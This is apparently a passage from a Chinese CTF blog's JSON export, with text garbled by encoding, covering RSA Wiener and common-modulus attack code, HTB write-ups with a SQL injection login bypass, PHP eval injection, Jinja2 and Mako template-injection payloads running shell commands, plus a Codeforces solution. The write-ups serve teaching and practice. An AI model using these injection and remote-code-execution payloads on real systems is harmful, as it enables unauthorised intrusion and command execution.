¹æ®è¿åˆ†æ•°åºåˆ— cf ç”Ÿæˆæ”¶æ•›åˆ†æ•° (k, d)&quot;&quot;&quot; n0, d0 = cf[0], 1 yield (n0, 1) if len(cf) == 1: return n1 = cf[1] * cf[0] + 1 d1 = cf[1] yield (n1, d1) for i in range(2, len(cf)): ni = cf[i] * n1 + n0 di = cf[i] * d1 + d0 yield (ni, di) n0, d0, n1, d1 = n1, d1, ni, didef is_perfect_square(x): &quot;&quot;&quot;åˆ¤æ–­ x æ˜¯å¦ä¸ºå®Œå…¨å¹³æ–¹æ•°&quot;&quot;&quot; if x &lt; 0: return False s = math.isqrt(x) return s * s == xdef wiener_attack(e, n): &quot;&quot;&quot; ä½¿ç”¨ Wiener æ”»å‡»å°è¯•æ¢å¤ RSA ç§é’¥ dã€‚ å‚æ•°: e: å…¬é’¥æŒ‡æ•° n: æ¨¡æ•° è¿”å›: è‹¥æˆåŠŸï¼Œè¿”å›ç§é’¥æŒ‡æ•° dï¼›å¦åˆ™è¿”å› Noneã€‚ &quot;&quot;&quot; cf = continued_fraction(e, n) for k, d in convergents_from_cf(cf): if k == 0: continue # æ£€æŸ¥ (e*d - 1) æ˜¯å¦è¢« k æ•´é™¤ï¼Œä»¥å¾—åˆ° phi if (e * d - 1) % k != 0: continue phi = (e * d - 1) // k # è®¡ç®—æ–¹ç¨‹ x^2 - (n - phi + 1)x + n = 0 çš„åˆ¤åˆ«å¼ s = n - phi + 1 discr = s * s - 4 * n if discr &gt;= 0 and is_perfect_square(discr): t = math.isqrt(discr) # è®¡ç®— p, q p = (s + t) // 2 q = (s - t) // 2 if p * q == n: return d return Nonen = e = c = d = wiener_attack(e, n)if d: print(f&quot;å¾—åˆ°d: &#123;d&#125;&quot;) m = pow(c, d, n) message = long_to_bytes(m).decode() print(f&quot;æ˜æ–‡å†…å®¹ä¸ºï¼š&#123;message&#125;&quot;)else: print(&quot;Wiener æ”»å‡»æœªèƒ½æ¢å¤ d&quot;) å…±æ¨¡æ”»å‡»é€‚ç”¨æƒ…å†µï¼šåŒä¸€æ¡æ˜æ–‡æ¶ˆæ¯è¢«ç”¨ç›¸åŒçš„æ¨¡æ•°ä½†ä¸åŒçš„æŒ‡æ•°åŠ å¯†å¤šæ¬¡ã€‚ å…±æ¨¡æ”»å‡»æˆç«‹å¿…é¡»æ»¡è¶³ä»¥ä¸‹å‡ ä¸ªæ¡ä»¶ï¼š ä½¿ç”¨ RSA åŠ å¯†çš„ä¸¤ä¸ªå¯†æ–‡ï¼š c_1 = m^{e_1} \\mod n,\\quad c_2 = m^{e_2} \\mod n ä¸¤ä¸ªå¯†æ–‡ $c_1$ å’Œ $c_1$ æ˜¯ä½¿ç”¨ç›¸åŒçš„æ¨¡æ•° nï¼Œä½†ä½¿ç”¨äº†ä¸åŒçš„æŒ‡æ•° eâ‚ å’Œ eâ‚‚åŠ å¯†å¾—åˆ°çš„ã€‚ $e_1$ å’Œ $e_2$ éœ€è¦æ»¡è¶³äº’è´¨ï¼š$\\text{gcd}(eâ‚, eâ‚‚) = 1$ã€‚ æ”»å‡»æ–¹æ³•ï¼šä½¿ç”¨æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•ï¼ˆExtended Euclidean Algorithmï¼‰ å½“æ»¡è¶³ä¸Šè¿°æ¡ä»¶æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•æ‰¾åˆ°æ•´æ•° x å’Œ yï¼Œä½¿å¾—ï¼š x \\cdot e_1 + y \\cdot e_2 = 1ç„¶åä¾¿å¯è®¡ç®—å‡ºæ˜æ–‡ï¼š m = \\Bigl((c_1^x \\cdot c_2^y) \\mod n \\Bigl)å› ä¸ºï¼š (c_1^x \\cdot c_2^y) \\equiv (m^{e_1})^x \\cdot (m^{e_2})^y \\equiv m^{x \\cdot e_1 + y \\cdot e_2} \\equiv m\\mod næ³¨æ„ï¼š å¦‚æœ x æˆ– y ä¸ºè´Ÿæ•°ï¼Œåˆ™éœ€è¦ä½¿ç”¨é€†å…ƒï¼ˆmodular inverseï¼‰å¤„ç†è´ŸæŒ‡æ•°ï¼š $ c^{-a} \\mod n = (c^{-1})^a \\mod n $ ä»£ç ç¤ºä¾‹ï¼š 123456789101112131415161718192021222324252627282930313233from Crypto.Util.number import inverse, long_to_bytesfrom math import gcdn = e1 = e2 = c1 = c2 = # ä½¿ç”¨æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•æ±‚å‡º x å’Œ ydef extended_gcd(a, b): if b == 0: return (1, 0) else: x1, y1 = extended_gcd(b, a % b) x = y1 y = x1 - (a // b) * y1 return (x, y)x, y = extended_gcd(e1, e2)# å¤„ç†è´ŸæŒ‡æ•°ï¼ˆè®¡ç®—é€†å…ƒï¼‰if x &lt; 0: c1 = inverse(c1, n) x = -xif y &lt; 0: c2 = inverse(c2, n) y = -ym = (pow(c1, x, n) * pow(c2, y, n)) % n# è§£å¯†åçš„æ˜æ–‡print(long_to_bytes(m))","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/tags/CTF/"},{"name":"RSA","slug":"RSA","permalink":"https://archer-baiyi.github.io/tags/RSA/"},{"name":"Fermat","slug":"Fermat","permalink":"https://archer-baiyi.github.io/tags/Fermat/"},{"name":"PEM","slug":"PEM","permalink":"https://archer-baiyi.github.io/tags/PEM/"},{"name":"CRT","slug":"CRT","permalink":"https://archer-baiyi.github.io/tags/CRT/"}]},{"title":"HTB Art Writeup","slug":"CTF/Misc/HTB-Art-Writeup","date":"2025-03-28T22:46:02.000Z","updated":"2025-04-02T21:33:27.623Z","comments":true,"path":"2025/03/28/CTF/Misc/HTB-Art-Writeup/","permalink":"https://archer-baiyi.github.io/2025/03/28/CTF/Misc/HTB-Art-Writeup/","excerpt":"","text":"é¢˜ç›®æè¿° ä¼šæ‹¿åˆ°ä¸€å¼ è¿™æ ·çš„å›¾ç‰‡ï¼š é¢˜è§£è¿™æ˜¯Pietï¼Œä¸€ç§esolangï¼ˆesoteric programming languageï¼‰ã€‚ï¼ˆè¯¦è§https://en.wikipedia.org/wiki/Esoteric_programming_language#Pietï¼‰ è¿™é“é¢˜å°±æ˜¯å¾ˆå…¸å‹çš„â€œçŸ¥é“å°±å¾ˆç®€å•ï¼Œä¸çŸ¥é“å°±å®Œå…¨æ²¡æ³•åšâ€ã€‚ å¯ä»¥ç”¨è¿™ä¸ªç½‘ç«™åœ¨çº¿è¿è¡Œï¼š https://www.bertnase.de/npiet/npiet-execute.php ç„¶åå¾—åˆ°flagï¼šHTB{p137_m0ndr14n}","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Misc","slug":"CTF/Misc","permalink":"https://archer-baiyi.github.io/categories/CTF/Misc/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Misc","slug":"Misc","permalink":"https://archer-baiyi.github.io/tags/Misc/"},{"name":"esolang","slug":"esolang","permalink":"https://archer-baiyi.github.io/tags/esolang/"},{"name":"Piet","slug":"Piet","permalink":"https://archer-baiyi.github.io/tags/Piet/"}]},{"title":"HTB-sanitize Writeup","slug":"CTF/Web/HTB-sanitize-Writeup","date":"2025-03-28T19:12:23.000Z","updated":"2025-04-02T21:32:15.403Z","comments":true,"path":"2025/03/28/CTF/Web/HTB-sanitize-Writeup/","permalink":"https://archer-baiyi.github.io/2025/03/28/CTF/Web/HTB-sanitize-Writeup/","excerpt":"","text":"é¢˜ç›®æè¿° ï¼ˆæ— é™„ä»¶ï¼‰ è§‚å¯Ÿæ‰“å¼€ç½‘é¡µï¼š éšä¾¿è¾“å…¥ä¸ªusernameå’Œpasswordä¼šçœ‹åˆ°ä¸‹æ–¹æœ‰ä¸€æ®µSQLä»£ç ï¼š æ¸—é€çŒœæµ‹ç½‘é¡µçš„ç™»å½•é€»è¾‘æ˜¯è¿™æ ·çš„ï¼šå¦‚æœå½“å‰selectæˆåŠŸï¼ˆä¹Ÿå°±æ˜¯è¯´èƒ½åœ¨æ•°æ®åº“é‡Œæ‰¾åˆ°å½“å‰è¾“å…¥çš„è´¦å·ä¿¡æ¯ï¼‰ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç™»å½•æˆåŠŸã€‚ æ‰€ä»¥ç›´æ¥SQL Injectionï¼Œåœ¨usernameä¸€æ è¾“å…¥ 1admin&#x27; -- ï¼Œç„¶åpasswordé‚£ä¸€æ è¾“å…¥ä»»æ„å†…å®¹ï¼ˆæ¯”å¦‚è¯´1ï¼‰ï¼Œå°±å¯ä»¥å¾—åˆ°flagï¼šHTB{SQL_1nj3ct1ng_my_w4y_0utta_h3r3}","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"SQL","slug":"SQL","permalink":"https://archer-baiyi.github.io/tags/SQL/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"SQL Injection","slug":"SQL-Injection","permalink":"https://archer-baiyi.github.io/tags/SQL-Injection/"}]},{"title":"HTB-LoveTok Writeup","slug":"CTF/Web/HTB-LoveTok-Writeup","date":"2025-03-28T10:30:49.000Z","updated":"2025-04-02T21:32:01.646Z","comments":true,"path":"2025/03/28/CTF/Web/HTB-LoveTok-Writeup/","permalink":"https://archer-baiyi.github.io/2025/03/28/CTF/Web/HTB-LoveTok-Writeup/","excerpt":"","text":"é¢˜ç›®æè¿° ï¼ˆæœ‰é™„ä»¶ï¼‰ è§‚å¯Ÿæ‰“å¼€ç½‘é¡µï¼š å½“ç‚¹å‡»äº†ä¸‹é¢é‚£ä¸ªæŒ‰é’®ä¹‹åç½‘é¡µçš„urlä¼šå¢åŠ ä¸€ä¸ªå‚æ•°ï¼š 1/?format=r å› ä¸ºç»™çš„é™„ä»¶æ¯”è¾ƒå¤šï¼Œæ‰€ä»¥ç›´æ¥æŒ¨ä¸ªæœç´¢â€œformatâ€ï¼Œå¯ä»¥ç¡®å®šä¸‹æ¥2ä»½ç›¸å…³ä»£ç ï¼š 12345678910&lt;?phpclass TimeController&#123; public function index($router) &#123; $format = isset($_GET[&#x27;format&#x27;]) ? $_GET[&#x27;format&#x27;] : &#x27;r&#x27;; $time = new TimeModel($format); return $router-&gt;view(&#x27;index&#x27;, [&#x27;time&#x27; =&gt; $time-&gt;getTime()]); &#125;&#125; è¿™é‡Œä¼šç›´æ¥æ¥æ”¶ï¼ˆæ²¡æœ‰è¿‡æ»¤ï¼‰æˆ‘ä»¬ä¼ å…¥çš„ format çš„å€¼ï¼Œç„¶åè°ƒç”¨ TimeModel å¤„ç†è¿™ä¸ªå€¼ã€‚ 123456789101112131415161718&lt;?phpclass TimeModel&#123; public function __construct($format) &#123; $this-&gt;format = addslashes($format); # æŠŠç”¨æˆ·è¾“å…¥çš„ format åšäº† addslashes() å¤„ç†ï¼Œä¼šæŠŠ &quot;, &#x27;, \\, NULL è¿™äº›å†…å®¹å‰é¢åŠ ä¸Šåæ–œæ è¿›è¡Œè½¬ä¹‰ã€‚ [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ]; $this-&gt;prediction = &quot;+$&#123;d&#125; day +$&#123;h&#125; hour +$&#123;m&#125; minute +$&#123;s&#125; second&quot;; &#125; public function getTime() &#123; eval(&#x27;$time = date(&quot;&#x27; . $this-&gt;format . &#x27;&quot;, strtotime(&quot;&#x27; . $this-&gt;prediction . &#x27;&quot;));&#x27;); return isset($time) ? $time : &#x27;Something went terribly wrong&#x27;; &#125;&#125; æ³¨æ„ï¼ŒPHP çš„ eval() å‡½æ•°ä¼šæŠŠä¼ å…¥çš„å­—ç¬¦ä¸²å½“ä½œ PHP ä»£ç æ¥æ‰§è¡Œã€‚æ‰€ä»¥è¿™é“é¢˜å¯ä»¥é€šè¿‡æ³¨å…¥phpä»£ç ï¼ˆä¸èƒ½åŒ…å« %}ï¼Œ{% kbd ' %}ï¼Œ{% kbd %}ï¼Œ{% kbd NULL %}ï¼‰æ¥è·å–flagã€‚ é¦–å…ˆå°è¯• 1/?format=$&#123;system(ls)&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"PHP","slug":"PHP","permalink":"https://archer-baiyi.github.io/tags/PHP/"},{"name":"PHP ä»£ç æ³¨å…¥","slug":"PHP-ä»£ç æ³¨å…¥","permalink":"https://archer-baiyi.github.io/tags/PHP-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"}]},{"title":"Codeforce Dragons","slug":"ç®—æ³•ç«èµ›/Codeforce/1000/Codeforce-Dragons","date":"2025-03-28T10:15:13.000Z","updated":"2025-04-02T11:06:13.363Z","comments":true,"path":"2025/03/28/ç®—æ³•ç«èµ›/Codeforce/1000/Codeforce-Dragons/","permalink":"https://archer-baiyi.github.io/2025/03/28/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/1000/Codeforce-Dragons/","excerpt":"","text":"é¢˜ç›®æè¿° æ€è·¯è¿™é“é¢˜çš„é‡ç‚¹æ˜¯å¯ä»¥è‡ªç”±æŒ‘é€‰æ‰“é¾™çš„é¡ºåºï¼Œæ‰€ä»¥å¯ä»¥ç”¨vectoræ¥å­˜å‚¨æ‰€æœ‰xï¼Œyçš„å€¼ï¼Œç„¶åè¿›è¡Œæ’åºã€‚ ä»£ç C++1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt; // for sortusing namespace std;int main() { int s, n; cin &gt;&gt; s &gt;&gt; n; vector&lt;pair&lt;int, int&gt;&gt; dragons(n); // æ¯æ¡é¾™æ˜¯ä¸€ä¸ª(x, y)çš„vector for (int i = 0; i &lt; n; ++i) { cin &gt;&gt; dragons[i].first &gt;&gt; dragons[i].second; // first æ˜¯ xï¼Œsecond æ˜¯ y } // æŒ‰ç…§é¾™çš„å¼ºåº¦ä»å°åˆ°å¤§æ’åº // é»˜è®¤å…ˆæŒ‰ç…§ pair çš„ first å‡åºæ’åˆ—ã€‚å¦‚æœ first ç›¸ç­‰ï¼Œå†æŒ‰ç…§ second å‡åºæ’åˆ— // beginå’Œendä¼šå¯¹æ‰€æœ‰å†…å®¹è¿›è¡Œæ’åºã€‚ sort(dragons.begin(), dragons.end()); for (int i = 0; i &lt; n; ++i) { if (s &gt; dragons[i].first) { s += dragons[i].second; // èµ¢äº†ï¼ŒåŠ æ•°å€¼çš„å¥–åŠ± } else { cout &lt;&lt; \"NO\" &lt;&lt; endl; return 0; } } cout &lt;&lt; \"YES\" &lt;&lt; endl; return 0;} å¦‚æœæ˜¯é™åºçš„è¯éœ€è¦å†™æˆ 123sort(dragons.begin(), dragons.end(), [](pair&lt;int, int&gt; a, pair&lt;int, int&gt; b) { return a.first &gt; b.first;});","categories":[{"name":"ç®—æ³•ç«èµ›","slug":"ç®—æ³•ç«èµ›","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"ç®—æ³•ç«èµ›/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"ç®—æ³•ç«èµ›","slug":"ç®—æ³•ç«èµ›","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"1000","slug":"1000","permalink":"https://archer-baiyi.github.io/tags/1000/"},{"name":"greedy","slug":"greedy","permalink":"https://archer-baiyi.github.io/tags/greedy/"},{"name":"sortings","slug":"sortings","permalink":"https://archer-baiyi.github.io/tags/sortings/"}]},{"title":"HTB Templated Writeup","slug":"CTF/Web/HTB-Templated-Writeup","date":"2025-03-27T20:02:53.000Z","updated":"2025-04-02T21:32:23.748Z","comments":true,"path":"2025/03/27/CTF/Web/HTB-Templated-Writeup/","permalink":"https://archer-baiyi.github.io/2025/03/27/CTF/Web/HTB-Templated-Writeup/","excerpt":"","text":"é¢˜ç›®æè¿° ï¼ˆæ— é™„ä»¶ï¼‰ è§‚å¯Ÿæ‰“å¼€ç½‘ç«™ä¼šå‘ç°ä¸€ç‰‡ç©ºç™½ï¼š ä¸“é—¨æç¤ºäº†æ˜¯Jinja2ï¼Œæ‰€ä»¥å¤§æ¦‚ç‡æ˜¯æ³¨å…¥ï¼Œè€ŒJinja2æ³¨å…¥çš„æ ¼å¼ä¸º 1{{ code }} ï¼ˆä»¥ä¸‹ç”¨serveræ¥æŒ‡ä»£å½“å‰ç½‘å€ï¼‰ å› ä¸ºæ²¡æœ‰ç»™ç½‘é¡µæºä»£ç ï¼Œæ‰€ä»¥åªèƒ½ä¸æ–­å°è¯•ã€‚ç„¶åä¼šå‘ç°å½“å°†å½“å‰urlä¿®æ”¹æˆ 1server/{{7*7}} æ—¶ï¼Œä¼šæ˜¾ç¤º å¯ä»¥çœ‹åˆ° 7*7 ç¡®å®è¢«æ‰§è¡Œäº†ï¼Œæ‰€ä»¥ç¡®å®šè¿™é‡Œå°±æ˜¯æ³¨å…¥å£ã€‚ æ¸—é€æœ‰è‡³å°‘2ç§æ–¹æ³•ï¼š ç¬¬ä¸€ç§é€šè¿‡æ¨¡æ¿ä¸­å‡½æ•°å¯¹è±¡çš„ __globals__ æ‹¿åˆ°å…¨å±€ä½œç”¨åŸŸï¼Œç„¶åå€ŸåŠ© ____builtins__[__import__]__ å¯¼å…¥ os ï¼Œç”¨ os.popen() æ‰§è¡Œå‘½ä»¤ã€‚ æ ¸å¿ƒé“¾è·¯ï¼š 1234567891011selfâ†“__init__ â† æ¨¡æ¿å‡½æ•°å¯¹è±¡â†“__globals__ â† å‡½æ•°çš„å…¨å±€å˜é‡å­—å…¸â†“__builtins__['__import__'] â† å¯¼å…¥å‡½æ•°â†“__import__('os') â† å¯¼å…¥ os æ¨¡å—â†“os.popen('å‘½ä»¤').read() â† æ‰§è¡Œå‘½ä»¤å¹¶è¯»å–ç»“æœ æŒ‰ä»¥ä¸‹é¡ºåºæ³¨å…¥ï¼š 1{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}} æˆ– 1{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }} ç¡®è®¤äº†å½“å‰æ³¨å…¥æ–¹å¼å¯è¡Œã€‚ ç„¶åæŸ¥æ‰¾ flag æ–‡ä»¶ï¼š 1{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}} æœ€åç›´æ¥è¯»å–flagï¼š 1{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }} ç¬¬äºŒç§ä½¿ç”¨è¿™ä¸ªæ¨¡æ¿æ¥å‘èµ·å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰æ”»å‡»ï¼š 1{{ [].__class__.__base__.__subclasses__()[&lt;index&gt;].__init__.__globals__['os'].popen('id').read() }} ï¼ˆéœ€è¦æ‰¾åˆ°popenå¯¹åº”çš„indexï¼‰ é¦–å…ˆç”¨ 1{{ [].__class__.__base__.__subclasses__() }} åˆ—å‡ºæ‰€æœ‰ subclassesï¼Œç„¶åé€šè¿‡ 12345{% for c in [].__class__.__base__.__subclasses__() %} {% if 'Popen' in c.__name__ %} {{ loop.index0 }}: {{ c }} {% endif %}{% endfor %} æ‰¾åˆ° popen çš„indexï¼š é€šè¿‡å°è¯• 1{{ [].__class__.__base__.__subclasses__()[414].__init__.__globals__['os'].popen('id').read() }} ç¡®è®¤å¯ä»¥æˆåŠŸRCEã€‚ æ¥ç€å°±è·Ÿä¹‹å‰ä¸€æ ·å…ˆæ‰¾ç„¶åå†è¯»å–flagï¼š 1{{ [].__class__.__base__.__subclasses__()[414].__init__.__globals__['os'].popen('ls').read() }} 1{{ [].__class__.__base__.__subclasses__()[414].__init__.__globals__['os'].popen('cat flag.txt').read() }} æ‹¿åˆ°flagï¼šHTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!} ã€‚","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"Template Injection","slug":"Template-Injection","permalink":"https://archer-baiyi.github.io/tags/Template-Injection/"},{"name":"æ¨¡æ¿æ³¨å…¥","slug":"æ¨¡æ¿æ³¨å…¥","permalink":"https://archer-baiyi.github.io/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"},{"name":"Jinja2","slug":"Jinja2","permalink":"https://archer-baiyi.github.io/tags/Jinja2/"}]},{"title":"HTB Spookifier Writeup","slug":"CTF/Web/HTB-Spookifier-Writeup","date":"2025-03-27T17:16:33.000Z","updated":"2025-04-02T21:32:19.507Z","comments":true,"path":"2025/03/27/CTF/Web/HTB-Spookifier-Writeup/","permalink":"https://archer-baiyi.github.io/2025/03/27/CTF/Web/HTB-Spookifier-Writeup/","excerpt":"","text":"é¢˜ç›®æè¿° ï¼ˆæœ‰é™„ä»¶ï¼‰ è§£é¢˜è§‚å¯Ÿæ‰“å¼€ç½‘ç«™ï¼š è¾“å…¥ â€œabcâ€œ ä¼šçœ‹åˆ°ï¼š ç„¶åæˆ‘ä»¬æ¥æŸ¥çœ‹ä»£ç ï¼ˆroutes.pyï¼‰ï¼š 1234567891011121314from flask import Blueprint, requestfrom flask_mako import render_templatefrom application.util import spookifyweb = Blueprint('web', __name__)@web.route('/')def index(): text = request.args.get('text') if(text): converted = spookify(text) return render_template('index.html',output=converted) return render_template('index.html',output='') å¯ä»¥çœ‹åˆ°ç½‘é¡µä¼šå°†æˆ‘ä»¬çš„è¾“å…¥ç»è¿‡ sppokify() å‡½æ•°è½¬æ¢ä¸€ä¸‹å†è¿›è¡Œè¾“å‡ºã€‚ æ‰€ä»¥æˆ‘ä»¬æ¥ç€æ¥æŸ¥çœ‹ util.py ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from mako.template import Templatefont1 = { 'A': 'ğ•¬', 'B': 'ğ•­', 'C': 'ğ•®', ...}font2 = { 'A': 'á—©', 'B': 'á—·', 'C': 'á‘¢', ...}font3 = { 'A': 'â‚³', 'B': 'à¸¿', 'C': 'â‚µ', ...} font4 = { 'A': 'A', 'B': 'B', 'C': 'C', ...}# æ³¨æ„ï¼Œè¿™é‡Œçš„font4æ”¶å½•äº†æ‰€æœ‰çš„å­—æ¯æ•°å­—ä»¥åŠç¬¦å·ï¼Œå¹¶æ²¡æœ‰åšä»»ä½•ä¿®æ”¹ã€‚def generate_render(converted_fonts): result = ''' &lt;tr&gt; &lt;td&gt;{0}&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;{1}&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;{2}&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;{3}&lt;/td&gt; &lt;/tr&gt; '''.format(*converted_fonts) return Template(result).render()def change_font(text_list): text_list = [*text_list] current_font = [] all_fonts = [] add_font_to_list = lambda text,font_type : ( [current_font.append(globals()[font_type].get(i, ' ')) for i in text], all_fonts.append(''.join(current_font)), current_font.clear() ) and None add_font_to_list(text_list, 'font1') add_font_to_list(text_list, 'font2') add_font_to_list(text_list, 'font3') add_font_to_list(text_list, 'font4') return all_fontsdef spookify(text): converted_fonts = change_font(text_list=text) return generate_render(converted_fonts=converted_fonts) å¯ä»¥çœ‹åˆ°å®šä¹‰äº†4ç§å­—ä½“ä»¥åŠè¾“å‡ºçš„é¡µé¢æ ¼å¼ã€‚change_font() å’Œ spookify() åˆ™è´Ÿè´£è½¬æ¢å­—ä½“ã€‚ å‡è®¾æˆ‘ä»¬è¾“å…¥äº† â€inputâ€œï¼Œé‚£ä¹ˆæœåŠ¡å™¨æŒ‰ç…§ä»¥ä¸‹æµç¨‹æ¥å¤„ç†æˆ‘ä»¬çš„è¾“å…¥ï¼š æ¥æ”¶æˆ‘ä»¬çš„è¾“å…¥å¹¶èµ‹å€¼ç»™ textï¼š 1text = request.args.get('text') è°ƒç”¨ spookify(text)ï¼š 1converted = spookify(text) 123def spookify(text): converted_fonts = change_font(text_list=text) return generate_render(converted_fonts=converted_fonts) æœ€åå†åˆ©ç”¨ generate_render() åˆ›å»ºæ¨¡æ¿ï¼š 123456789def generate_render(converted_fonts): result = ''' &lt;tr&gt;&lt;td&gt;{0}&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;{1}&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;{2}&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;{3}&lt;/td&gt;&lt;/tr&gt; '''.format(*converted_fonts) return Template(result).render() æ³¨æ„ï¼Œå› ä¸º font4 å®Œå…¨ä¸ä¼šä¿®æ”¹æˆ‘ä»¬è¾“å…¥çš„å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬è¾“å…¥çš„æ‰€ä»¥å†…å®¹ï¼ˆåŒ…æ‹¬å„ç§ç‰¹æ®Šç¬¦å·ï¼‰éƒ½ä¼šä¿ç•™ä¸‹æ¥å¹¶è¢«æ¸²æŸ“è¿› {3} çš„ä½ç½®ã€‚ æ¼æ´+æ¸—é€è¿™é“é¢˜ä¸»è¦è€ƒå¯Ÿçš„æ˜¯ Template Injectionï¼ˆæ¨¡æ¿æ³¨å…¥ï¼‰ï¼š æ¨¡æ¿æ³¨å…¥æ˜¯æŒ‡æ”»å‡»è€…å°†æ¶æ„ä»£ç æ³¨å…¥åˆ°æ¨¡æ¿å¼•æ“ä¸­ï¼Œä½¿æ¨¡æ¿å¼•æ“åœ¨æ¸²æŸ“æ—¶æ‰§è¡Œæ”»å‡»è€…æ§åˆ¶çš„è¡¨è¾¾å¼ï¼Œé€ æˆä¿¡æ¯æ³„éœ²ã€RCEï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼‰ç­‰åæœã€‚ æ¼æ´ä¸»è¦ç”±è¿™å‡ éƒ¨åˆ†ä¸€èµ·æ„æˆï¼š æ²¡æœ‰å¯¹è¾“å…¥å†…å®¹è¿›è¡Œè¿‡æ»¤ï¼› font4ä¼šä¿ç•™æˆ‘ä»¬çš„æ‰€æœ‰è¾“å…¥å†…å®¹ ä½¿ç”¨ Template(â€¦).render() åŠ¨æ€æ¸²æŸ“å­—ç¬¦ä¸²æ¨¡æ¿ Makoé‡Œåˆšå¥½æœ‰è¡¨è¾¾å¼è¯­æ³•ï¼š 1${} æ‰€ä»¥å¯¼è‡´æˆ‘ä»¬è¾“å…¥ 1${7*7} æ—¶ï¼Œmakoä¼šåœ¨æ¸²æŸ“è¿™éƒ¨åˆ†å†…å®¹ 1234&lt;tr&gt;&lt;td&gt;{0}&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;{1}&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;{2}&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;${7*7}&lt;/td&gt;&lt;/tr&gt; æ—¶ï¼Œæ‰§è¡Œæˆ‘ä»¬çš„ä»£ç ï¼Œå³ ${7*7}ã€‚æ‰€ä»¥æœ€åçš„æ¸²æŸ“ç»“æœæ˜¯ï¼š 1&lt;tr&gt;&lt;td&gt;49&lt;/td&gt;&lt;/tr&gt; è¿™æ ·å­å°±æˆ‘ä»¬è¯´æ˜æ³¨å…¥æˆåŠŸäº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è€ƒè™‘å¦‚ä½•è¯»å–flagäº†ã€‚ å› ä¸ºMako çš„åº•å±‚ä»£ç ä¼šæŠŠ ${ } è¡¨è¾¾å¼é‡Œçš„å†…å®¹ç¼–è¯‘æˆ Python ä»£ç 